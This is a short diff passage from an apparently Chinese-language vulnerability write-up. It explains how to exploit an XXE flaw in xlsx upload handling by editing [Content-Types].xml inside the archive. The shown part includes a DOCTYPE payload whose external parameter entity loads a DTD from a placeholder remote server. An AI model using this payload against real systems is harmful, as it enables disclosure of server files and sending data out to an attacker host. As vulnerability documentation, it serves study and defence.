@@ -233,7 +233,7 @@ if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
 ```
 利用：
 本地新建.xlsx文件，修改后缀名.zip，打开压缩包，其中有[Content-Types].xml文件。
-修改[Content-Types].xml，第二行添加如下内容，保存。
+修改[Content-Types].xml，第二行添加如下内容（原来的第二行放下面），保存。
 ```
 <!DOCTYPE convert [
 <!ENTITY % remote SYSTEM "http://远程服务器/xxx.dtd">
